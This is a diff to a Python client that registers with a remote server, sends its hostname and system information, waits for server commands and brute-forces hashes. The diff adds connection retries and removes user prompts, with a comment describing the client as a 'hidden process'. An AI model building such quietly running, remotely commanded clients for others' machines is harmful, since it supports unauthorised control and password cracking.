@@ -33,7 +33,9 @@ RESET = "\033[0m"
 def setup_connection(server, port, client_name, system_info):
     ADDR = (server, port)
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.settimeout(10)  # 10 second timeout for connection
     client.connect(ADDR)
+    client.settimeout(None)  # Remove timeout after successful connection
     
     #========= Send client name
     name_bytes = client_name.encode(FORMAT)
@@ -287,28 +289,51 @@ def brute_force_discovery(hash_value, start_range, end_range, length=6):
     return None # Pattern not found in this chunk
 
 if __name__ == "__main__":
-    print("═" * 80)
+    import time as time_module
+    
+    print("=" * 80)
     print("              CLIENT - Connecting to Server")
-    print("═" * 80)
+    print("=" * 80)
     
     #server = input("\nEnter server IP (default: 192.168.100.250): ") or "192.168.100.250"
     #port_input = input("Enter server port (default: 5050): ") or "5050"
     port = 8558
-    name =  socket.gethostname()
+    name = socket.gethostname()
     
-    print(f"\n[*] Connecting to server {server}:{port} as '{name}'...")
-    print(f"[*] Gathering system information...")
+    # Retry logic for connection
+    max_retries = 5
+    retry_delay = 3  # seconds
+    client = None
+    
+    for attempt in range(max_retries):
+        print(f"\n[*] Connection attempt {attempt + 1}/{max_retries} to {server}:{port} as '{name}'...")
+        print(f"[*] Gathering system information...")
+        
+        try:
+            system_info = get_system_info()
+            client = setup_connection(server, port, name, system_info)
+            print(f"Successfully connected to {server}:{port}")
+            print(f"Client name '{name}' sent to server")
+            print(f"System information sent to server")
+            print("\nConnection established. Client is now registered with the server.")
+            break  # Success, exit retry loop
+        except (ConnectionRefusedError, socket.timeout, OSError) as e:
+            print(f"[!] Failed to connect: {e}")
+            if attempt < max_retries - 1:
+                print(f"[*] Retrying in {retry_delay} seconds...")
+                time_module.sleep(retry_delay)
+            else:
+                print(f"[!] Max retries reached. Could not connect to {server}:{port}")
+                print("[!] Make sure the server is running and the address is correct.")
+                # Exit without waiting for input (hidden process)
+                sys.exit(1)
+    
+    if client is None:
+        sys.exit(1)
+    
+    print("Waiting for server commands...\n")
     
     try:
-        system_info = get_system_info()
-        client = setup_connection(server, port, name, system_info)
-        print(f"Successfully connected to {server}:{port}")
-        print(f"Client name '{name}' sent to server")
-        print(f"System information sent to server")
-        print("\nConnection established. Client is now registered with the server.")
-        print("Press Ctrl+C to disconnect...\n")
-        
-        
         while True:
             try:
                 message_data = receive_message(client)
@@ -429,60 +454,24 @@ if __name__ == "__main__":
                 continue
             except (ConnectionResetError, ConnectionAbortedError):
                 # Server disconnected us gracefully or forcibly
-                print(f"\n{YELLOW}┌{'─'*78}┐{RESET}")
-                print(f"{YELLOW}│{RESET} {BLUE}ℹ DISCONNECTED BY SERVER{RESET}                                               {YELLOW}│{RESET}")
-                print(f"{YELLOW}├{'─'*78}┤{RESET}")
-                print(f"{YELLOW}│{RESET}   The server has closed the connection.                                  {YELLOW}│{RESET}")
-                print(f"{YELLOW}│{RESET}   This may be due to a server-side disconnect command.                   {YELLOW}│{RESET}")
-                print(f"{YELLOW}└{'─'*78}┘{RESET}")
-                print("\nPress Enter to exit...")
-                input()
+                print(f"\n{YELLOW}[!] Disconnected by server{RESET}")
                 break
             except OSError as e:
                 # Check for specific Windows socket errors
                 if hasattr(e, 'winerror') and e.winerror in (10054, 10053):
-                    # 10054 = Connection reset by peer
-                    # 10053 = Connection aborted
-                    print(f"\n{YELLOW}┌{'─'*78}┐{RESET}")
-                    print(f"{YELLOW}│{RESET} {BLUE}ℹ DISCONNECTED BY SERVER{RESET}                                               {YELLOW}│{RESET}")
-                    print(f"{YELLOW}├{'─'*78}┤{RESET}")
-                    print(f"{YELLOW}│{RESET}   The server has closed the connection.                                  {YELLOW}│{RESET}")
-                    print(f"{YELLOW}│{RESET}   This may be due to a server-side disconnect command.                   {YELLOW}│{RESET}")
-                    print(f"{YELLOW}└{'─'*78}┘{RESET}")
+                    print(f"\n{YELLOW}[!] Disconnected by server{RESET}")
                 else:
-                    print(f"\n{RED}┌{'─'*78}┐{RESET}")
-                    print(f"{RED}│{RESET} {YELLOW}⚠ CONNECTION ERROR{RESET}                                                     {RED}│{RESET}")
-                    print(f"{RED}├{'─'*78}┤{RESET}")
-                    print(f"{RED}│{RESET}   An unexpected network error occurred.                                  {RED}│{RESET}")
-                    error_str = str(e)[:60]
-                    padding = 63 - len(error_str)
-                    print(f"{RED}│{RESET}   Error: {error_str}{' '*padding}{RED}│{RESET}")
-                    print(f"{RED}└{'─'*78}┘{RESET}")
-                print("\nPress Enter to exit...")
-                input()
+                    print(f"\n{RED}[!] Connection error: {e}{RESET}")
                 break
             
-    except ConnectionRefusedError:
-        print(f"Failed to connect to {server}:{port}")
-        print("Make sure the server is running and the address is correct.")
-        print("\nPress Enter to exit...")
-        input()
     except KeyboardInterrupt:
         print("\nDisconnecting from server...")
-        client.close()
-        print("Connection closed.")
-        print("\nPress Enter to exit...")
-
-        input()
     except Exception as e:
         print(f"An error occurred: {e}")
-        if 'client' in locals():
-            client.close()
-        print("\nPress Enter to exit...")
-        input()
     finally:
-        if 'client' in locals():
+        if client:
             try:
                 client.close()
+                print("Connection closed.")
             except:
                 pass
